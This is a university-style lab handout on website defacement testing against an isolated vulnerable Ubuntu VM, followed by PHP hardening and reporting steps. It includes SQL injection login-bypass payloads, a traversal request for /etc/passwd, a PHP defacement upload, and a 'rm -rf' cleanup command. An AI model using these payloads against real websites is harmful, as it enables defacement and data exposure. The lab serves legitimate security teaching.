# Lab 4: Website Defacement Testing - Step-by-Step Instructions

## Objective
Learn to identify and demonstrate website vulnerabilities that could lead to defacement attacks. This lab teaches both offensive (testing) and defensive (hardening) techniques.

## Prerequisites
- Kali Linux (attacker machine)
- Ubuntu Linux (target machine) 
- Both machines on the same network
- Basic knowledge of Linux commands

## Lab Duration: 2-3 hours

---

## Part 1: Environment Setup (30 minutes)

### Step 1.1: Prepare Target System (Ubuntu)
1. Start your Ubuntu VM
2. Open terminal and run the setup script:
```bash
# Copy the setup script to Ubuntu
# Make it executable and run
chmod +x setup_vulnerable_target.sh
sudo ./setup_vulnerable_target.sh
```

3. Verify the web server is running:
```bash
curl http://localhost
```

4. Note the Ubuntu IP address:
```bash
ip addr show
```

### Step 1.2: Prepare Attack System (Kali)
1. Start your Kali Linux VM
2. Install Python dependencies:
```bash
pip3 install -r requirements.txt
```

3. Verify connectivity to Ubuntu:
```bash
ping <ubuntu-ip>
curl http://<ubuntu-ip>
```

---

## Part 2: Vulnerability Scanning (45 minutes)

### Step 2.1: Basic Reconnaissance
1. Use Nmap to scan the target:
```bash
nmap -sV -p 80,443 <ubuntu-ip>
```

2. Check what web technologies are running:
```bash
whatweb http://<ubuntu-ip>
```

### Step 2.2: Run the Python Testing Script
1. Execute the vulnerability scanner:
```bash
python3 website_deface_test.py http://<ubuntu-ip>
```

2. Observe the output and note any vulnerabilities found

### Step 2.3: Manual Testing
1. Test SQL Injection manually:
```bash
# Try accessing login page
curl http://<ubuntu-ip>/login.php

# Test SQL injection payload
curl -X POST -d "username=' OR '1'='1&password=anything" http://<ubuntu-ip>/auth.php
```

2. Test Directory Traversal:
```bash
curl "http://<ubuntu-ip>/view.php?file=../../../etc/passwd"
```

---

## Part 3: Exploitation Demonstration (45 minutes)

### Step 3.1: SQL Injection Exploitation
1. Use the script to demonstrate SQL injection:
```bash
python3 website_deface_test.py http://<ubuntu-ip> -o sql_injection_report.txt
```

2. Manually verify the injection:
```bash
# Using curl with SQL payload
curl -X POST -d "username=admin'--&password=anything" http://<ubuntu-ip>/auth.php
```

### Step 3.2: File Upload Exploitation
1. Create a malicious PHP file:
```bash
cat > deface.php << 'EOF'
<?php
echo "<h1>HACKED BY IA-650 STUDENT</h1>";
echo "<p>This is a security demonstration</p>";
phpinfo();
?>
EOF
```

2. Upload the file using curl:
```bash
curl -X POST -F "file=@deface.php" http://<ubuntu-ip>/upload.php
```

3. Access the uploaded file:
```bash
curl http://<ubuntu-ip>/uploads/deface.php
```

### Step 3.3: Defacement Simulation
1. Run the defacement simulation:
```bash
python3 website_deface_test.py http://<ubuntu-ip> -o defacement_simulation.txt
```

2. Review the generated defacement HTML content

---

## Part 4: Security Hardening (30 minutes)

### Step 4.1: Patch SQL Injection
1. Edit the vulnerable authentication script:
```bash
sudo nano /var/www/html/auth.php
```

2. Replace with secure version:
```php
<?php
// SECURE AUTHENTICATION
$username = $_POST['username'];
$password = $_POST['password'];

// Use prepared statements
$conn = new mysqli("localhost", "root", "", "testdb");
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    echo "<h1>Welcome Admin!</h1>";
} else {
    echo "<h1>Login Failed</h1>";
}
?>
```

### Step 4.2: Secure File Upload
1. Create secure upload script:
```bash
sudo nano /var/www/html/upload.php
```

2. Add file validation:
```php
<?php
$allowed_types = ['jpg', 'png', 'gif'];
$max_size = 1024 * 1024; // 1MB

if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
    $filename = basename($_FILES['file']['name']);
    $file_ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $file_size = $_FILES['file']['size'];
    
    if (!in_array($file_ext, $allowed_types)) {
        die("File type not allowed");
    }
    
    if ($file_size > $max_size) {
        die("File too large");
    }
    
    // Generate safe filename
    $safe_filename = time() . '_' . preg_replace("/[^A-Za-z0-9.]/", "", $filename);
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $safe_filename)) {
        echo "File uploaded successfully";
    }
}
?>
```

### Step 4.3: Prevent Directory Traversal
1. Secure the file viewer:
```bash
sudo nano /var/www/html/view.php
```

2. Add path validation:
```php
<?php
$filename = $_GET['file'];
$base_dir = '/var/www/html/';

// Prevent directory traversal
$filepath = realpath($base_dir . $filename);
$real_base = realpath($base_dir);

if (strpos($filepath, $real_base) !== 0 || !file_exists($filepath)) {
    die("Access denied");
}

echo "<pre>" . htmlspecialchars(file_get_contents($filepath)) . "</pre>";
?>
```

---

## Part 5: Verification and Reporting (30 minutes)

### Step 5.1: Re-test Security
1. Run the scanner again:
```bash
python3 website_deface_test.py http://<ubuntu-ip> -o post_patch_report.txt
```

2. Compare before and after results

### Step 5.2: Generate Security Report
Create a comprehensive report including:
1. Executive summary
2. Vulnerabilities found
3. Exploitation steps
4. Patching procedures
5. Verification results
6. Recommendations

### Step 5.3: Documentation
Document:
- Screenshots of exploitation
- Code changes made
- Test results
- Lessons learned

---

## Analysis Questions

1. **Vulnerability Analysis**
   - What made the original code vulnerable?
   - How could these vulnerabilities be discovered automatically?
   - What are the business impacts of each vulnerability type?

2. **Defense Analysis**
   - Which defense mechanisms were most effective?
   - What additional security measures would you recommend?
   - How would you implement defense-in-depth?

3. **Process Analysis**
   - What steps in the testing process were most critical?
   - How would this process differ in a real penetration test?
   - What legal and ethical considerations apply?

---

## Bonus Challenges

### Challenge 1: Web Application Firewall
1. Install ModSecurity on Ubuntu
2. Configure rules to block common attacks
3. Test effectiveness against the Python script

### Challenge 2: Intrusion Detection
1. Set up basic file integrity monitoring
2. Configure logging for suspicious activities
3. Create alerts for defacement attempts

### Challenge 3: Automated Testing
1. Modify the Python script to test additional vulnerabilities
2. Add XSS testing capabilities
3. Implement automated reporting

---

## Cleanup

After completing the lab:
1. Stop the web server on Ubuntu:
```bash
sudo systemctl stop apache2
```

2. Remove vulnerable files:
```bash
sudo rm -rf /var/www/html/*
```

3. Remove test database:
```bash
sudo mysql -u root -e "DROP DATABASE testdb;"
```

4. Document all findings and clean up any sensitive data

---

## Assessment Criteria

- **Technical Skills**: Proper execution of commands and scripts
- **Understanding**: Ability to explain vulnerabilities and defenses
- **Documentation**: Quality of reports and documentation
- **Problem Solving**: Ability to troubleshoot issues
- **Ethical Conduct**: Following responsible disclosure practices

---

## Instructor Notes

This lab demonstrates:
- Common web application vulnerabilities
- Hands-on penetration testing techniques
- Security hardening procedures
- Documentation and reporting skills

The lab should be supervised and conducted only on isolated lab networks.
